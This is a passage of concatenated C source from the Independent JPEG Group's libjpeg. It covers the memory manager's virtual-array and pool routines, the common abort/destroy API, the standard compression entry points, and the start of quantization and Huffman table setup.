    /* One chunk, but check for short chunk at end of buffer */
    rows = MIN((long) ptr->rowsperchunk, (long) ptr->rows_in_mem - i);
    /* Transfer no more than is currently defined */
    thisrow = (long) ptr->cur_start_row + i;
    rows = MIN(rows, (long) ptr->first_undef_row - thisrow);
    /* Transfer no more than fits in file */
    rows = MIN(rows, (long) ptr->rows_in_array - thisrow);
    if (rows <= 0)		/* this chunk might be past end of file! */
      break;
    byte_count = rows * bytesperrow;
    if (writing)
      (*ptr->b_s_info.write_backing_store) (cinfo, & ptr->b_s_info,
					    (void FAR *) ptr->mem_buffer[i],
					    file_offset, byte_count);
    else
      (*ptr->b_s_info.read_backing_store) (cinfo, & ptr->b_s_info,
					   (void FAR *) ptr->mem_buffer[i],
					   file_offset, byte_count);
    file_offset += byte_count;
  }
}


METHODDEF(JSAMPARRAY)
access_virt_sarray (j_common_ptr cinfo, jvirt_sarray_ptr ptr,
		    JDIMENSION start_row, JDIMENSION num_rows,
		    boolean writable)
/* Access the part of a virtual sample array starting at start_row */
/* and extending for num_rows rows.  writable is true if  */
/* caller intends to modify the accessed area. */
{
  JDIMENSION end_row = start_row + num_rows;
  JDIMENSION undef_row;

  /* debugging check */
  if (end_row > ptr->rows_in_array || num_rows > ptr->maxaccess ||
      ptr->mem_buffer == NULL)
    ERREXIT(cinfo, JERR_BAD_VIRTUAL_ACCESS);

  /* Make the desired part of the virtual array accessible */
  if (start_row < ptr->cur_start_row ||
      end_row > ptr->cur_start_row+ptr->rows_in_mem) {
    if (! ptr->b_s_open)
      ERREXIT(cinfo, JERR_VIRTUAL_BUG);
    /* Flush old buffer contents if necessary */
    if (ptr->dirty) {
      do_sarray_io(cinfo, ptr, TRUE);
      ptr->dirty = FALSE;
    }
    /* Decide what part of virtual array to access.
     * Algorithm: if target address > current window, assume forward scan,
     * load starting at target address.  If target address < current window,
     * assume backward scan, load so that target area is top of window.
     * Note that when switching from forward write to forward read, will have
     * start_row = 0, so the limiting case applies and we load from 0 anyway.
     */
    if (start_row > ptr->cur_start_row) {
      ptr->cur_start_row = start_row;
    } else {
      /* use long arithmetic here to avoid overflow & unsigned problems */
      long ltemp;

      ltemp = (long) end_row - (long) ptr->rows_in_mem;
      if (ltemp < 0)
	ltemp = 0;		/* don't fall off front end of file */
      ptr->cur_start_row = (JDIMENSION) ltemp;
    }
    /* Read in the selected part of the array.
     * During the initial write pass, we will do no actual read
     * because the selected part is all undefined.
     */
    do_sarray_io(cinfo, ptr, FALSE);
  }
  /* Ensure the accessed part of the array is defined; prezero if needed.
   * To improve locality of access, we only prezero the part of the array
   * that the caller is about to access, not the entire in-memory array.
   */
  if (ptr->first_undef_row < end_row) {
    if (ptr->first_undef_row < start_row) {
      if (writable)		/* writer skipped over a section of array */
	ERREXIT(cinfo, JERR_BAD_VIRTUAL_ACCESS);
      undef_row = start_row;	/* but reader is allowed to read ahead */
    } else {
      undef_row = ptr->first_undef_row;
    }
    if (writable)
      ptr->first_undef_row = end_row;
    if (ptr->pre_zero) {
      size_t bytesperrow = (size_t) ptr->samplesperrow * SIZEOF(JSAMPLE);
      undef_row -= ptr->cur_start_row; /* make indexes relative to buffer */
      end_row -= ptr->cur_start_row;
      while (undef_row < end_row) {
	jzero_far((void FAR *) ptr->mem_buffer[undef_row], bytesperrow);
	undef_row++;
      }
    } else {
      if (! writable)		/* reader looking at undefined data */
	ERREXIT(cinfo, JERR_BAD_VIRTUAL_ACCESS);
    }
  }
  /* Flag the buffer dirty if caller will write in it */
  if (writable)
    ptr->dirty = TRUE;
  /* Return address of proper part of the buffer */
  return ptr->mem_buffer + (start_row - ptr->cur_start_row);
}


METHODDEF(JBLOCKARRAY)
access_virt_barray (j_common_ptr cinfo, jvirt_barray_ptr ptr,
		    JDIMENSION start_row, JDIMENSION num_rows,
		    boolean writable)
/* Access the part of a virtual block array starting at start_row */
/* and extending for num_rows rows.  writable is true if  */
/* caller intends to modify the accessed area. */
{
  JDIMENSION end_row = start_row + num_rows;
  JDIMENSION undef_row;

  /* debugging check */
  if (end_row > ptr->rows_in_array || num_rows > ptr->maxaccess ||
      ptr->mem_buffer == NULL)
    ERREXIT(cinfo, JERR_BAD_VIRTUAL_ACCESS);

  /* Make the desired part of the virtual array accessible */
  if (start_row < ptr->cur_start_row ||
      end_row > ptr->cur_start_row+ptr->rows_in_mem) {
    if (! ptr->b_s_open)
      ERREXIT(cinfo, JERR_VIRTUAL_BUG);
    /* Flush old buffer contents if necessary */
    if (ptr->dirty) {
      do_barray_io(cinfo, ptr, TRUE);
      ptr->dirty = FALSE;
    }
    /* Decide what part of virtual array to access.
     * Algorithm: if target address > current window, assume forward scan,
     * load starting at target address.  If target address < current window,
     * assume backward scan, load so that target area is top of window.
     * Note that when switching from forward write to forward read, will have
     * start_row = 0, so the limiting case applies and we load from 0 anyway.
     */
    if (start_row > ptr->cur_start_row) {
      ptr->cur_start_row = start_row;
    } else {
      /* use long arithmetic here to avoid overflow & unsigned problems */
      long ltemp;

      ltemp = (long) end_row - (long) ptr->rows_in_mem;
      if (ltemp < 0)
	ltemp = 0;		/* don't fall off front end of file */
      ptr->cur_start_row = (JDIMENSION) ltemp;
    }
    /* Read in the selected part of the array.
     * During the initial write pass, we will do no actual read
     * because the selected part is all undefined.
     */
    do_barray_io(cinfo, ptr, FALSE);
  }
  /* Ensure the accessed part of the array is defined; prezero if needed.
   * To improve locality of access, we only prezero the part of the array
   * that the caller is about to access, not the entire in-memory array.
   */
  if (ptr->first_undef_row < end_row) {
    if (ptr->first_undef_row < start_row) {
      if (writable)		/* writer skipped over a section of array */
	ERREXIT(cinfo, JERR_BAD_VIRTUAL_ACCESS);
      undef_row = start_row;	/* but reader is allowed to read ahead */
    } else {
      undef_row = ptr->first_undef_row;
    }
    if (writable)
      ptr->first_undef_row = end_row;
    if (ptr->pre_zero) {
      size_t bytesperrow = (size_t) ptr->blocksperrow * SIZEOF(JBLOCK);
      undef_row -= ptr->cur_start_row; /* make indexes relative to buffer */
      end_row -= ptr->cur_start_row;
      while (undef_row < end_row) {
	jzero_far((void FAR *) ptr->mem_buffer[undef_row], bytesperrow);
	undef_row++;
      }
    } else {
      if (! writable)		/* reader looking at undefined data */
	ERREXIT(cinfo, JERR_BAD_VIRTUAL_ACCESS);
    }
  }
  /* Flag the buffer dirty if caller will write in it */
  if (writable)
    ptr->dirty = TRUE;
  /* Return address of proper part of the buffer */
  return ptr->mem_buffer + (start_row - ptr->cur_start_row);
}


/*
 * Release all objects belonging to a specified pool.
 */

METHODDEF(void)
free_pool (j_common_ptr cinfo, int pool_id)
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  small_pool_ptr shdr_ptr;
  large_pool_ptr lhdr_ptr;
  size_t space_freed;

  if (pool_id < 0 || pool_id >= JPOOL_NUMPOOLS)
    ERREXIT1(cinfo, JERR_BAD_POOL_ID, pool_id);	/* safety check */

#ifdef MEM_STATS
  if (cinfo->err->trace_level > 1)
    print_mem_stats(cinfo, pool_id); /* print pool's memory usage statistics */
#endif

  /* If freeing IMAGE pool, close any virtual arrays first */
  if (pool_id == JPOOL_IMAGE) {
    jvirt_sarray_ptr sptr;
    jvirt_barray_ptr bptr;

    for (sptr = mem->virt_sarray_list; sptr != NULL; sptr = sptr->next) {
      if (sptr->b_s_open) {	/* there may be no backing store */
	sptr->b_s_open = FALSE;	/* prevent recursive close if error */
	(*sptr->b_s_info.close_backing_store) (cinfo, & sptr->b_s_info);
      }
    }
    mem->virt_sarray_list = NULL;
    for (bptr = mem->virt_barray_list; bptr != NULL; bptr = bptr->next) {
      if (bptr->b_s_open) {	/* there may be no backing store */
	bptr->b_s_open = FALSE;	/* prevent recursive close if error */
	(*bptr->b_s_info.close_backing_store) (cinfo, & bptr->b_s_info);
      }
    }
    mem->virt_barray_list = NULL;
  }

  /* Release large objects */
  lhdr_ptr = mem->large_list[pool_id];
  mem->large_list[pool_id] = NULL;

  while (lhdr_ptr != NULL) {
    large_pool_ptr next_lhdr_ptr = lhdr_ptr->hdr.next;
    space_freed = lhdr_ptr->hdr.bytes_used +
		  lhdr_ptr->hdr.bytes_left +
		  SIZEOF(large_pool_hdr);
    jpeg_free_large(cinfo, (void FAR *) lhdr_ptr, space_freed);
    mem->total_space_allocated -= space_freed;
    lhdr_ptr = next_lhdr_ptr;
  }

  /* Release small objects */
  shdr_ptr = mem->small_list[pool_id];
  mem->small_list[pool_id] = NULL;

  while (shdr_ptr != NULL) {
    small_pool_ptr next_shdr_ptr = shdr_ptr->hdr.next;
    space_freed = shdr_ptr->hdr.bytes_used +
		  shdr_ptr->hdr.bytes_left +
		  SIZEOF(small_pool_hdr);
    jpeg_free_small(cinfo, (void *) shdr_ptr, space_freed);
    mem->total_space_allocated -= space_freed;
    shdr_ptr = next_shdr_ptr;
  }
}


/*
 * Close up shop entirely.
 * Note that this cannot be called unless cinfo->mem is non-NULL.
 */

METHODDEF(void)
self_destruct (j_common_ptr cinfo)
{
  int pool;

  /* Close all backing store, release all memory.
   * Releasing pools in reverse order might help avoid fragmentation
   * with some (brain-damaged) malloc libraries.
   */
  for (pool = JPOOL_NUMPOOLS-1; pool >= JPOOL_PERMANENT; pool--) {
    free_pool(cinfo, pool);
  }

  /* Release the memory manager control block too. */
  jpeg_free_small(cinfo, (void *) cinfo->mem, SIZEOF(my_memory_mgr));
  cinfo->mem = NULL;		/* ensures I will be called only once */

  jpeg_mem_term(cinfo);		/* system-dependent cleanup */
}


/*
 * Memory manager initialization.
 * When this is called, only the error manager pointer is valid in cinfo!
 */

GLOBAL(void)
jinit_memory_mgr (j_common_ptr cinfo)
{
  my_mem_ptr mem;
  long max_to_use;
  int pool;
  size_t test_mac;

  cinfo->mem = NULL;		/* for safety if init fails */

  /* Check for configuration errors.
   * SIZEOF(ALIGN_TYPE) should be a power of 2; otherwise, it probably
   * doesn't reflect any real hardware alignment requirement.
   * The test is a little tricky: for X>0, X and X-1 have no one-bits
   * in common if and only if X is a power of 2, ie has only one one-bit.
   * Some compilers may give an "unreachable code" warning here; ignore it.
   */
  if ((SIZEOF(ALIGN_TYPE) & (SIZEOF(ALIGN_TYPE)-1)) != 0)
    ERREXIT(cinfo, JERR_BAD_ALIGN_TYPE);
  /* MAX_ALLOC_CHUNK must be representable as type size_t, and must be
   * a multiple of SIZEOF(ALIGN_TYPE).
   * Again, an "unreachable code" warning may be ignored here.
   * But a "constant too large" warning means you need to fix MAX_ALLOC_CHUNK.
   */
  test_mac = (size_t) MAX_ALLOC_CHUNK;
  if ((long) test_mac != MAX_ALLOC_CHUNK ||
      (MAX_ALLOC_CHUNK % SIZEOF(ALIGN_TYPE)) != 0)
    ERREXIT(cinfo, JERR_BAD_ALLOC_CHUNK);

  max_to_use = jpeg_mem_init(cinfo); /* system-dependent initialization */

  /* Attempt to allocate memory manager's control block */
  mem = (my_mem_ptr) jpeg_get_small(cinfo, SIZEOF(my_memory_mgr));

  if (mem == NULL) {
    jpeg_mem_term(cinfo);	/* system-dependent cleanup */
    ERREXIT1(cinfo, JERR_OUT_OF_MEMORY, 0);
  }

  /* OK, fill in the method pointers */
  mem->pub.alloc_small = alloc_small;
  mem->pub.alloc_large = alloc_large;
  mem->pub.alloc_sarray = alloc_sarray;
  mem->pub.alloc_barray = alloc_barray;
  mem->pub.request_virt_sarray = request_virt_sarray;
  mem->pub.request_virt_barray = request_virt_barray;
  mem->pub.realize_virt_arrays = realize_virt_arrays;
  mem->pub.access_virt_sarray = access_virt_sarray;
  mem->pub.access_virt_barray = access_virt_barray;
  mem->pub.free_pool = free_pool;
  mem->pub.self_destruct = self_destruct;

  /* Make MAX_ALLOC_CHUNK accessible to other modules */
  mem->pub.max_alloc_chunk = MAX_ALLOC_CHUNK;

  /* Initialize working state */
  mem->pub.max_memory_to_use = max_to_use;

  for (pool = JPOOL_NUMPOOLS-1; pool >= JPOOL_PERMANENT; pool--) {
    mem->small_list[pool] = NULL;
    mem->large_list[pool] = NULL;
  }
  mem->virt_sarray_list = NULL;
  mem->virt_barray_list = NULL;

  mem->total_space_allocated = SIZEOF(my_memory_mgr);

  /* Declare ourselves open for business */
  cinfo->mem = & mem->pub;

  /* Check for an environment variable JPEGMEM; if found, override the
   * default max_memory setting from jpeg_mem_init.  Note that the
   * surrounding application may again override this value.
   * If your system doesn't support getenv(), define NO_GETENV to disable
   * this feature.
   */
#ifndef NO_GETENV
  { char * memenv;

    if ((memenv = getenv("JPEGMEM")) != NULL) {
      char ch = 'x';

      if (sscanf(memenv, "%ld%c", &max_to_use, &ch) > 0) {
	if (ch == 'm' || ch == 'M')
	  max_to_use *= 1000L;
	mem->pub.max_memory_to_use = max_to_use * 1000L;
      }
    }
  }
#endif

}
/*
 * jcomapi.c
 *
 * Copyright (C) 1994-1997, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains application interface routines that are used for both
 * compression and decompression.
 */


/*
 * Abort processing of a JPEG compression or decompression operation,
 * but don't destroy the object itself.
 *
 * For this, we merely clean up all the nonpermanent memory pools.
 * Note that temp files (virtual arrays) are not allowed to belong to
 * the permanent pool, so we will be able to close all temp files here.
 * Closing a data source or destination, if necessary, is the application's
 * responsibility.
 */

GLOBAL(void)
jpeg_abort (j_common_ptr cinfo)
{
  int pool;

  /* Do nothing if called on a not-initialized or destroyed JPEG object. */
  if (cinfo->mem == NULL)
    return;

  /* Releasing pools in reverse order might help avoid fragmentation
   * with some (brain-damaged) malloc libraries.
   */
  for (pool = JPOOL_NUMPOOLS-1; pool > JPOOL_PERMANENT; pool--) {
    (*cinfo->mem->free_pool) (cinfo, pool);
  }

  /* Reset overall state for possible reuse of object */
  if (cinfo->is_decompressor) {
    cinfo->global_state = DSTATE_START;
    /* Try to keep application from accessing now-deleted marker list.
     * A bit kludgy to do it here, but this is the most central place.
     */
    ((j_decompress_ptr) cinfo)->marker_list = NULL;
  } else {
    cinfo->global_state = CSTATE_START;
  }
}


/*
 * Destruction of a JPEG object.
 *
 * Everything gets deallocated except the master jpeg_compress_struct itself
 * and the error manager struct.  Both of these are supplied by the application
 * and must be freed, if necessary, by the application.  (Often they are on
 * the stack and so don't need to be freed anyway.)
 * Closing a data source or destination, if necessary, is the application's
 * responsibility.
 */

GLOBAL(void)
jpeg_destroy (j_common_ptr cinfo)
{
  /* We need only tell the memory manager to release everything. */
  /* NB: mem pointer is NULL if memory mgr failed to initialize. */
  if (cinfo->mem != NULL)
    (*cinfo->mem->self_destruct) (cinfo);
  cinfo->mem = NULL;		/* be safe if jpeg_destroy is called twice */
  cinfo->global_state = 0;	/* mark it destroyed */
}


/*
 * Convenience routines for allocating quantization and Huffman tables.
 * (Would jutils.c be a more reasonable place to put these?)
 */

GLOBAL(JQUANT_TBL *)
jpeg_alloc_quant_table (j_common_ptr cinfo)
{
  JQUANT_TBL *tbl;

  tbl = (JQUANT_TBL *)
    (*cinfo->mem->alloc_small) (cinfo, JPOOL_PERMANENT, SIZEOF(JQUANT_TBL));
  tbl->sent_table = FALSE;	/* make sure this is false in any new table */
  return tbl;
}


GLOBAL(JHUFF_TBL *)
jpeg_alloc_huff_table (j_common_ptr cinfo)
{
  JHUFF_TBL *tbl;

  tbl = (JHUFF_TBL *)
    (*cinfo->mem->alloc_small) (cinfo, JPOOL_PERMANENT, SIZEOF(JHUFF_TBL));
  tbl->sent_table = FALSE;	/* make sure this is false in any new table */
  return tbl;
}
/*
 * jcapistd.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains application interface code for the compression half
 * of the JPEG library.  These are the "standard" API routines that are
 * used in the normal full-compression case.  They are not used by a
 * transcoding-only application.  Note that if an application links in
 * jpeg_start_compress, it will end up linking in the entire compressor.
 * We thus must separate this file from jcapimin.c to avoid linking the
 * whole compression library into a transcoder.
 */


/*
 * Compression initialization.
 * Before calling this, all parameters and a data destination must be set up.
 *
 * We require a write_all_tables parameter as a failsafe check when writing
 * multiple datastreams from the same compression object.  Since prior runs
 * will have left all the tables marked sent_table=TRUE, a subsequent run
 * would emit an abbreviated stream (no tables) by default.  This may be what
 * is wanted, but for safety's sake it should not be the default behavior:
 * programmers should have to make a deliberate choice to emit abbreviated
 * images.  Therefore the documentation and examples should encourage people
 * to pass write_all_tables=TRUE; then it will take active thought to do the
 * wrong thing.
 */

GLOBAL(void)
jpeg_start_compress (j_compress_ptr cinfo, boolean write_all_tables)
{
  if (cinfo->global_state != CSTATE_START)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  if (write_all_tables)
    jpeg_suppress_tables(cinfo, FALSE);	/* mark all tables to be written */

  /* (Re)initialize error mgr and destination modules */
  (*cinfo->err->reset_error_mgr) ((j_common_ptr) cinfo);
  (*cinfo->dest->init_destination) (cinfo);
  /* Perform master selection of active modules */
  jinit_compress_master(cinfo);
  /* Set up for the first pass */
  (*cinfo->master->prepare_for_pass) (cinfo);
  /* Ready for application to drive first pass through jpeg_write_scanlines
   * or jpeg_write_raw_data.
   */
  cinfo->next_scanline = 0;
  cinfo->global_state = (cinfo->raw_data_in ? CSTATE_RAW_OK : CSTATE_SCANNING);
}


/*
 * Write some scanlines of data to the JPEG compressor.
 *
 * The return value will be the number of lines actually written.
 * This should be less than the supplied num_lines only in case that
 * the data destination module has requested suspension of the compressor,
 * or if more than image_height scanlines are passed in.
 *
 * Note: we warn about excess calls to jpeg_write_scanlines() since
 * this likely signals an application programmer error.  However,
 * excess scanlines passed in the last valid call are *silently* ignored,
 * so that the application need not adjust num_lines for end-of-image
 * when using a multiple-scanline buffer.
 */

GLOBAL(JDIMENSION)
jpeg_write_scanlines (j_compress_ptr cinfo, JSAMPARRAY scanlines,
		      JDIMENSION num_lines)
{
  JDIMENSION row_ctr, rows_left;

  if (cinfo->global_state != CSTATE_SCANNING)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);
  if (cinfo->next_scanline >= cinfo->image_height)
    WARNMS(cinfo, JWRN_TOO_MUCH_DATA);

  /* Call progress monitor hook if present */
  if (cinfo->progress != NULL) {
    cinfo->progress->pass_counter = (long) cinfo->next_scanline;
    cinfo->progress->pass_limit = (long) cinfo->image_height;
    (*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);
  }

  /* Give master control module another chance if this is first call to
   * jpeg_write_scanlines.  This lets output of the frame/scan headers be
   * delayed so that application can write COM, etc, markers between
   * jpeg_start_compress and jpeg_write_scanlines.
   */
  if (cinfo->master->call_pass_startup)
    (*cinfo->master->pass_startup) (cinfo);

  /* Ignore any extra scanlines at bottom of image. */
  rows_left = cinfo->image_height - cinfo->next_scanline;
  if (num_lines > rows_left)
    num_lines = rows_left;

  row_ctr = 0;
  (*cinfo->main->process_data) (cinfo, scanlines, &row_ctr, num_lines);
  cinfo->next_scanline += row_ctr;
  return row_ctr;
}


/*
 * Alternate entry point to write raw data.
 * Processes exactly one iMCU row per call, unless suspended.
 */

GLOBAL(JDIMENSION)
jpeg_write_raw_data (j_compress_ptr cinfo, JSAMPIMAGE data,
		     JDIMENSION num_lines)
{
  JDIMENSION lines_per_iMCU_row;

  if (cinfo->global_state != CSTATE_RAW_OK)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);
  if (cinfo->next_scanline >= cinfo->image_height) {
    WARNMS(cinfo, JWRN_TOO_MUCH_DATA);
    return 0;
  }

  /* Call progress monitor hook if present */
  if (cinfo->progress != NULL) {
    cinfo->progress->pass_counter = (long) cinfo->next_scanline;
    cinfo->progress->pass_limit = (long) cinfo->image_height;
    (*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);
  }

  /* Give master control module another chance if this is first call to
   * jpeg_write_raw_data.  This lets output of the frame/scan headers be
   * delayed so that application can write COM, etc, markers between
   * jpeg_start_compress and jpeg_write_raw_data.
   */
  if (cinfo->master->call_pass_startup)
    (*cinfo->master->pass_startup) (cinfo);

  /* Verify that at least one iMCU row has been passed. */
  lines_per_iMCU_row = cinfo->max_v_samp_factor * DCTSIZE;
  if (num_lines < lines_per_iMCU_row)
    ERREXIT(cinfo, JERR_BUFFER_SIZE);

  /* Directly compress the row. */
  if (! (*cinfo->coef->compress_data) (cinfo, data)) {
    /* If compressor did not consume the whole row, suspend processing. */
    return 0;
  }

  /* OK, we processed one iMCU row. */
  cinfo->next_scanline += lines_per_iMCU_row;
  return lines_per_iMCU_row;
}
/*
 * jcparam.c
 *
 * Copyright (C) 1991-1998, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains optional default-setting code for the JPEG compressor.
 * Applications do not have to use this file, but those that don't use it
 * must know a lot more about the innards of the JPEG code.
 */


/*
 * Quantization table setup routines
 */

GLOBAL(void)
jpeg_add_quant_table (j_compress_ptr cinfo, int which_tbl,
		      const unsigned int *basic_table,
		      int scale_factor, boolean force_baseline)
/* Define a quantization table equal to the basic_table times
 * a scale factor (given as a percentage).
 * If force_baseline is TRUE, the computed quantization table entries
 * are limited to 1..255 for JPEG baseline compatibility.
 */
{
  JQUANT_TBL ** qtblptr;
  int i;
  long temp;

  /* Safety check to ensure start_compress not called yet. */
  if (cinfo->global_state != CSTATE_START)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  if (which_tbl < 0 || which_tbl >= NUM_QUANT_TBLS)
    ERREXIT1(cinfo, JERR_DQT_INDEX, which_tbl);

  qtblptr = & cinfo->quant_tbl_ptrs[which_tbl];

  if (*qtblptr == NULL)
    *qtblptr = jpeg_alloc_quant_table((j_common_ptr) cinfo);

  for (i = 0; i < DCTSIZE2; i++) {
    temp = ((long) basic_table[i] * scale_factor + 50L) / 100L;
    /* limit the values to the valid range */
    if (temp <= 0L) temp = 1L;
    if (temp > 32767L) temp = 32767L; /* max quantizer needed for 12 bits */
    if (force_baseline && temp > 255L)
      temp = 255L;		/* limit to baseline range if requested */
    (*qtblptr)->quantval[i] = (UINT16) temp;
  }

  /* Initialize sent_table FALSE so table will be written to JPEG file. */
  (*qtblptr)->sent_table = FALSE;
}


GLOBAL(void)
jpeg_set_linear_quality (j_compress_ptr cinfo, int scale_factor,
			 boolean force_baseline)
/* Set or change the 'quality' (quantization) setting, using default tables
 * and a straight percentage-scaling quality scale.  In most cases it's better
 * to use jpeg_set_quality (below); this entry point is provided for
 * applications that insist on a linear percentage scaling.
 */
{
  /* These are the sample quantization tables given in JPEG spec section K.1.
   * The spec says that the values given produce "good" quality, and
   * when divided by 2, "very good" quality.
   */
  static const unsigned int std_luminance_quant_tbl[DCTSIZE2] = {
    16,  11,  10,  16,  24,  40,  51,  61,
    12,  12,  14,  19,  26,  58,  60,  55,
    14,  13,  16,  24,  40,  57,  69,  56,
    14,  17,  22,  29,  51,  87,  80,  62,
    18,  22,  37,  56,  68, 109, 103,  77,
    24,  35,  55,  64,  81, 104, 113,  92,
    49,  64,  78,  87, 103, 121, 120, 101,
    72,  92,  95,  98, 112, 100, 103,  99
  };
  static const unsigned int std_chrominance_quant_tbl[DCTSIZE2] = {
    17,  18,  24,  47,  99,  99,  99,  99,
    18,  21,  26,  66,  99,  99,  99,  99,
    24,  26,  56,  99,  99,  99,  99,  99,
    47,  66,  99,  99,  99,  99,  99,  99,
    99,  99,  99,  99,  99,  99,  99,  99,
    99,  99,  99,  99,  99,  99,  99,  99,
    99,  99,  99,  99,  99,  99,  99,  99,
    99,  99,  99,  99,  99,  99,  99,  99
  };

  /* Set up two quantization tables using the specified scaling */
  jpeg_add_quant_table(cinfo, 0, std_luminance_quant_tbl,
		       scale_factor, force_baseline);
  jpeg_add_quant_table(cinfo, 1, std_chrominance_quant_tbl,
		       scale_factor, force_baseline);
}


GLOBAL(int)
jpeg_quality_scaling (int quality)
/* Convert a user-specified quality rating to a percentage scaling factor
 * for an underlying quantization table, using our recommended scaling curve.
 * The input 'quality' factor should be 0 (terrible) to 100 (very good).
 */
{
  /* Safety limit on quality factor.  Convert 0 to 1 to avoid zero divide. */
  if (quality <= 0) quality = 1;
  if (quality > 100) quality = 100;

  /* The basic table is used as-is (scaling 100) for a quality of 50.
   * Qualities 50..100 are converted to scaling percentage 200 - 2*Q;
   * note that at Q=100 the scaling is 0, which will cause jpeg_add_quant_table
   * to make all the table entries 1 (hence, minimum quantization loss).
   * Qualities 1..50 are converted to scaling percentage 5000/Q.
   */
  if (quality < 50)
    quality = 5000 / quality;
  else
    quality = 200 - quality*2;

  return quality;
}


GLOBAL(void)
jpeg_set_quality (j_compress_ptr cinfo, int quality, boolean force_baseline)
/* Set or change the 'quality' (quantization) setting, using default tables.
 * This is the standard quality-adjusting entry point for typical user
 * interfaces; only those who want detailed control over quantization tables
 * would use the preceding three routines directly.
 */
{
  /* Convert user 0-100 rating to percentage scaling */
  quality = jpeg_quality_scaling(quality);

  /* Set up standard quality tables */
  jpeg_set_linear_quality(cinfo, quality, force_baseline);
}


/*
 * Huffman table setup routines
 */

LOCAL(void)
add_huff_table (j_compress_ptr cinfo,
		JHUFF_TBL **htblptr, const UINT8 *bits, const UINT8 *val)
/* Define a Huffman table */
{
  int nsymbols, len;

  if (*htblptr == NULL)
    *htblptr = jpeg_alloc_huff_table((j_common_ptr) cinfo);

  /* Copy the number-of-symbols-of-each-code-length counts */
  MEMCOPY((*htblptr)->bits, bits, SIZEOF((*htblptr)->bits));

  /* Validate the counts.  We do this here mainly so we can copy the right
   * number of symbols from the val[] array, without risking marching off
   * the end of memory.  jchuff.c will do a more thorough test later.
   */
  nsymbols = 0;
  for (len = 1; len <= 16; len++)
    nsymbols += bits[len];
  if (nsymbols < 1 || nsymbols > 256)
    ERREXIT(cinfo, JERR_BAD_HUFF_TABLE);

  MEMCOPY((*htblptr)->huffval, val, nsymbols * SIZEOF(UINT8));

  /* Initialize sent_table FALSE so table will be written to JPEG file. */
  (*htblptr)->sent_table = FALSE;
}


LOCAL(void)
std_huff_tables (j_compress_ptr cinfo)
/* Set up the standard Huffman tables (cf. JPEG standard section K.3) */
/* IMPORTANT: these are only valid for 8-bit data precision! */
{
  static const UINT8 bits_dc_luminance[17] =
    { /* 0-base */ 0, 0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0 };
  static const UINT8 val_dc_luminance[] =
    { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };
  
  static const UINT8 bits_dc_chrominance[17] =
    { /* 0-base */ 0, 0, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0 };
  static const UINT8 val_dc_chrominance[] =
    { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };
  
  static const UINT8 bits_ac_luminance[17] =
    { /* 0-base */ 0, 0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d };
  static const UINT8 val_ac_luminance[] =
    { 0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12,
      0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
      0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xa1, 0x08,
      0x23, 0x42, 0xb1, 0xc1, 0x15, 0x52, 0xd1, 0xf0,
      0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0a, 0x16,
      0x17, 0x18, 0x19, 0x1a, 0x25, 0x26, 0x27, 0x28,
      0x29, 0x2a, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
      0x3a, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
      0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
      0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
      0x6a, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79,
      0x7a, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
      0x8a, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
      0x99, 0x9a, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
      0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6,
      0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3, 0xc4, 0xc5,
      0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xd2, 0xd3, 0xd4,
      0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xe1, 0xe2,
      0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea,
      0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
      0xf9, 0xfa };
  
  static const UINT8 bits_ac_chrominance[17] =
    { /* 0-base */ 0, 0, 2, 1, 2, 4, 4, 3, 4, 7, 5, 4, 4, 0, 1, 2, 0x77 };
  static const UINT8 val_ac_chrominance[] =
    { 0x00, 0x01, 0x02, 0x03, 0x11, 0x04, 0x05, 0x21,
      0x31, 0x06, 0x12, 0x41, 0x51, 0x07, 0x61, 0x71,
      0x13, 0x22, 0x32, 0x81, 0x08, 0x14, 0x42, 0x91,
      0xa1, 0xb1, 0xc1, 0x09, 0x23, 0x33, 0x52, 0xf0,
      0x15, 0x62, 0x72, 0xd1, 0x0a, 0x16, 0x24, 0x34,
      0xe1, 0x25, 0xf1, 0x17, 0x18, 0x19, 0x1a, 0x26,
      0x27, 0x28, 0x29, 0x2a, 0x35, 0x36, 0x37, 0x38,
      0x39, 0x3a, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
      0x49, 0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
